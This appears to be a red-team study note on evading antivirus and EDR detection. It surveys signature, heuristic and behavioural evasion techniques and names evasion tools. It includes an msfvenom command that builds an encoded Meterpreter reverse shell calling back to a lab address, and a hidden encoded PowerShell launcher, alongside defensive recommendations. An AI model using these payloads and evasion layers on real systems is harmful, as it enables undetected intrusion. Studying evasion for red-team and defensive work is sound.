**Antivirus evasion** refers to the techniques used to **bypass detection by antivirus (AV), EDR, and other security solutions** when delivering or executing malicious payloads. These methods are common in **red teaming**, **malware development**, and **adversary emulation**.

> 🧠 The goal is not to disable AV, but to **avoid detection long enough to execute the payload**.

---

## 🎯 Why It Matters

- AV engines use **signature, heuristic, and behavioral detection**
- Default payloads (e.g., from `msfvenom`) are easily flagged
- Evasion is key in **post-exploitation**, **malware staging**, and **stealth persistence**

---

## 🧱 Detection Types & Evasion Goals

| Detection Type       | Description                          | Evasion Strategy                        |
|----------------------|--------------------------------------|------------------------------------------|
| **Signature-based**   | Matches byte patterns (hashes, strings) | Obfuscate code, change payload structure |
| **Heuristic-based**   | Suspicious patterns or behaviors     | Break known patterns, add junk logic     |
| **Behavioral (EDR)**  | Monitors API calls, memory ops, flow | Delay execution, use LOLBins, evade memory inspection |

---

## 🛠 Static Evasion Techniques

| Technique             | Description                                |
|-----------------------|--------------------------------------------|
| **Encoding/Obfuscation** | Use `msfvenom` encoders or custom encoders |
| **Packing**           | Compress/encrypt with UPX or custom packers|
| **String Encryption** | Encode suspicious strings (e.g., base64)   |
| **Custom Compilation**| Recompile payload with minor changes       |
| **Change Metadata**   | Modify filename, icon, PE headers          |
| **Split Logic**       | Break payload into multiple smaller stages |

### 🔧 Example with `msfvenom` + encoding:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o evade.exe
```

## 🔬 Behavioral Evasion Techniques

|Technique|Description|
|---|---|
|**Process Injection**|Inject shellcode into legit processes|
|**Memory Unhooking**|Restore/patch system functions to bypass EDR|
|**Parent Spoofing**|Spawn from `explorer.exe`, `svchost.exe`, etc|
|**Delay Execution**|Sleep or loop before payload runs|
|**Indirect Syscalls**|Avoid detection by using syscall stubs|
|**LOLBins**|Use `mshta`, `rundll32`, `regsvr32`, etc.|

---

## 🧩 Common Tools for Evasion

|Tool / Framework|Purpose|
|---|---|
|**Veil Framework**|Payload obfuscation for AV evasion|
|**Shellter**|Inject shellcode into clean PE files|
|**Nimcrypt**|Create payloads using Nim for AV evasion|
|**Donut**|Convert .NET DLLs/EXEs into shellcode|
|**CactusTorch**|Reflective DLL injection via macros|
|**FUDcry**|Crypter that obfuscates known payloads|

---

## 🧠 Best Practices

- Use **custom payloads**, not off-the-shelf
- Combine **multiple evasion layers** (e.g., obfuscation + LOLBin + injection)
- Test in **realistic EDR environments** (e.g., Defender, CrowdStrike)
- Monitor with **Sysmon** and **procmon** to understand detection triggers
- Use **encryption and staging** for payload delivery

---

## 📘 Example: Evasion via PowerShell LOLBin

```
powershell -nop -w hidden -enc <base64-encoded-payload>
```

- Avoids writing payload to disk
- Encoded and executed entirely in memory
- Triggered via Office macro or HTA

## 🧪 Testing Efficacy

|Service / Tool|Purpose|
|---|---|
|**VirusTotal**|Multi-engine AV scanning (non-private!)|
|**Any.Run**|Online sandbox with AV/EDR simulation|
|**CAPE Sandbox**|Analyze dropped files, processes, and registry keys|
|**Sysmon + ELK**|Detect suspicious execution flows|

> ⚠️ Never upload red team payloads to VirusTotal unless it’s scrubbed of unique signatures.

---

## 🔐 Defensive Recommendations

- Monitor LOLBins and encoded PowerShell
- Detect parent/child anomalies (e.g., `WINWORD → powershell`)
- Enable advanced logging (Sysmon, command-line auditing)
- Block unsigned macros and scripting tools (AppLocker/WDAC)
- Use EDR/XDR with behavioral detection, not just AV

---

## 🔗 Related Topics

- [[Payload Creation with msfvenom]]
- [[EDR & Threat Detection]]
- [[Post-Exploitation]]
- [[Persistence Techniques]]
- [[Metasploit]]

---

## 🏷 Suggested Tags

#antivirus_evasion #red_team #post_exploitation #obfuscation #bypass #payloads #defense_evasion #mitre_attack

---

## ✅ To Do

-  Build and encode payloads using multiple encoders
-  Simulate evasion via PowerShell and measure detection
-  Test payloads in EDR/AV-equipped VMs
-  Document which evasions are blocked by each solution
